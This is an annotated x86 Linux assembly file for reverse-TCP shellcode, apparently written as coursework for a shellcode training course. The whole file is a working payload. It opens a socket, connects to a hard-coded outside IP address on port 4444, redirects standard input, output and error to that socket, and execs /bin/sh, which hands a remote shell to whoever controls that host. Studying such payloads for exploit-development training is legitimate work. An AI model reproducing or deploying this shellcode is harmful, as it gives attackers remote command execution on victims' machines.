;Linux/x86 reverse_tcp Shellcode
;by Anton Ostrokonskiy @ostrokonskiy
;SLAE-924

global _start

section .text
_start:

;sockfd = socket(AF_INET, SOCK_STREAM, 0);
    push BYTE 0x66    ;syscall number of socketcall is 102 (0x66)
    pop eax           ;syscall number moved to eax
    xor edx, edx      ;zero out edx
    xor ebx, ebx      ;zero out ebx
    inc ebx           ;now ebx stores 1 = sys_socket syscall number
    push edx          ;start creating of arg array in reverse order {0, 1, 2}
    push ebx          ;now we pushing 1 to the stack (socket type = 1 = SOCK_STREAM)
    push 0x2          ;pushing 2 to the stack (socket domain = 2 = AF_INET)
    mov ecx, esp      ;copy arg array to ecx
    int 0x80          ;sockfd = socket(AF_INET, SOCK_STREAM, 0)

    xchg edx, eax     ;save socket fd in edx

;sa.sin_family = AF_INET
;sa.sin_port = htons(REMOTE_PORT)
;sa.sin_addr.s_addr = inet_addr(REMOTE_ADDR)

    push BYTE 0x66           ;socketcall (syscall 102)
    pop eax
    push DWORD 0x465e8e5b    ;push IP-address 91.142.94.70
    push WORD 0x5c11         ;push port 4444
    inc ebx
    push word bx             ;push AF_INET = 2
    mov ecx, esp             ;save it in ECX register

;connect(s, (struct sockaddr *)&sa, sizeof(sa))

    push 0x10       ;sizeof structure (16)
    push ecx        ;pushing sa structure created above
    push edx        ;pushing socket descriptor created in the first step
    mov ecx, esp    ;saving all parameters for connect()
    inc ebx         ;now ebx = 3
    int 0x80        ;call connect

;dup2(client_fd, 0)
;dup2(client_fd, 1)
;dup2(client_fd, 2)

    xchg ebx, edx    ;move connected socket fd in ebx

    mov al, 0x3f     ;dup2 syscall number #63
    xor ecx, ecx     ;ecx now contains 0 - standart input
    int 0x80         ;dup(client_fd, 0)

    mov al, 0x3f     ;dup2 syscall number #63
    inc ecx          ;ecx now contains 1 - standart output
    int 0x80         ;dup(client_fd, 1)

    mov al, 0x3f     ;dup2 syscall number #63
    inc ecx          ;ecx now contains 2 - standart error
    int 0x80         ;dup(client_fd, 2)

;execve("/bin/sh", NULL, NULL)

    mov al, 11         ;execve syscall number 11
    xor edx, edx       ;zero out edx
    xor ecx, ecx       ;zero out ecx
    push edx           ;push some nulls for string termination
    push 0x68732f2f    ;push "//sh" to the stack
    push 0x6e69622f    ;push "/bin" to the stack
    mov ebx, esp       ;put the address of "/bin//sh" into ebx via esp
    push edx           ;push 32-bit null terminator to stack
    mov edx, esp       ;empty array for envp
    push ebx           ;push string addr to stack above null terminator
    mov ecx, esp       ;argv array with string pointer
    int 0x80           ;execve("/bin//sh", ["/bin//sh", NULL], [NULL]) 
